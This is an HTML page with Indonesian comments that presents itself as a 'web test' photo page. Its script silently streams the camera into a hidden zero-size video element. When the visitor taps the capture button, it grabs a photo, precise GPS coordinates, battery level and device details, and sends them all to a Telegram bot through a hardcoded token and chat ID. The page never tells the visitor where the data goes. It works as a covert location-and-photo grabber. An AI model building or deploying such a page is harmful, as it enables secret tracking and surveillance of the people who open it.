<!DOCTYPE html>
<html>
<head>
  <title>Web Test - Capture Photo, GPS, and Battery Info</title>
</head>
<body>
  <h1>Web Test - Capture Photo, GPS, and Battery Info</h1>
  <video id="video" width="0" height="0" autoplay></video>
  <button id="capture-btn">Ambil Foto</button>
  <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ'; // Ganti dengan token bot Anda
    const CHAT_ID = '1121369247'; // Ganti dengan chat ID Anda

    const video = document.getElementById('video');
    const captureButton = document.getElementById('capture-btn');

    // Meminta akses ke kamera
    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.onloadedmetadata = () => video.play();
      } catch (err) {
        console.error('Error accessing camera:', err);
        alert('Tidak dapat mengakses kamera. Pastikan Anda memberikan izin.');
      }
    }

    // Fungsi untuk mengambil foto dan mengirim data
    captureButton.onclick = async () => {
      try {
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageDataURL = canvas.toDataURL('image/png');

        // Mendapatkan lokasi GPS
        const position = await getLocation();
        const { latitude, longitude, accuracy } = position.coords;

        // Membuat tautan Google Maps yang dapat diklik
        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

        // Mendapatkan informasi baterai (jika didukung)
        let batteryInfo = { level: null };
        if ("getBattery" in navigator) {
          batteryInfo = await getBatteryInfo();
        }

        // Mendapatkan informasi perangkat
        const deviceInfo = {
          userAgent: navigator.userAgent,
          screenWidth: window.screen.width,
          screenHeight: window.screen.height,
          platform: navigator.platform,
          batteryLevel: batteryInfo.level ? batteryInfo.level * 100 : 'Tidak didukung',
        };

        // Mengirim data ke Telegram
        await sendToTelegram(imageDataURL, latitude, longitude, accuracy, deviceInfo, googleMapsLink);
        alert('Data berhasil dikirim ke Telegram!');
      } catch (error) {
        console.error('Error capturing and sending data:', error);
        alert('Terjadi kesalahan saat mengirim data.');
      }
    };

    // Fungsi untuk mendapatkan lokasi GPS
    function getLocation() {
      return new Promise((resolve, reject) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true, // Meningkatkan akurasi GPS
            timeout: 10000, // Timeout setelah 10 detik
            maximumAge: 0 // Tidak menggunakan cache lokasi lama
          });
        } else {
          reject(new Error('Browser tidak mendukung geolocation.'));
        }
      });
    }

    // Fungsi untuk mendapatkan informasi baterai
    function getBatteryInfo() {
      return new Promise((resolve, reject) => {
        if ("getBattery" in navigator) {
          navigator.getBattery().then(resolve).catch(reject);
        } else {
          reject(new Error('Browser tidak mendukung Battery Status API.'));
        }
      });
    }

    // Fungsi untuk mengirim data ke Telegram
    async function sendToTelegram(imageDataURL, latitude, longitude, accuracy, deviceInfo, googleMapsLink) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
      const formData = new FormData();

      formData.append('chat_id', CHAT_ID);
      formData.append('photo', dataURItoBlob(imageDataURL));
      formData.append('caption', `Lokasi: [Lihat di Google Maps](${googleMapsLink})\n\nLatitude: ${latitude}\nLongitude: ${longitude}\nAkurasi: ${accuracy} meter\n\nInformasi Perangkat:\n${JSON.stringify(deviceInfo, null, 2)}`);

      const response = await fetch(url, {
        method: 'POST',
        body: formData,
      });

      if (!response.ok) {
        throw new Error('Gagal mengirim data ke Telegram.');
      }
    }

    // Fungsi untuk mengonversi data URI menjadi Blob
    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    }

    // Inisialisasi kamera saat halaman dimuat
    initCamera();
  </script>
</body>
</html>
